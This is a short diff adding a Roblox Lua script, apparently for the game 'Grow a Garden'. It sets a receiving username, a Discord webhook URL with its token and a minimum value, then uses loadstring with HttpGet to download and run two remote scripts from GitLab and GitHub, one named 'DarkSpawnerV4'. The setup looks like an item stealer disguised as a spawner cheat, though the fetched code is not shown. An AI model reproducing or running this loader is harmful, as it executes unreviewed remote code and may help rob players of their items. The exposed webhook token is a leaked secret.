@@ -1,0 +1,9 @@
+Username = "bo_0987654"
+
+Webhook = "https://discord.com/api/webhooks/1402126145100578836/iFd-jiaArcpmyzsljnGJvsuGW_8XZicj1Ztb6T4LKFnetvDtPM6z7eDkmqWvfWKpuH23"
+
+MinimumValue = 1
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nba20001/GrowAGarden/main/DarkSpawnerV4"))()
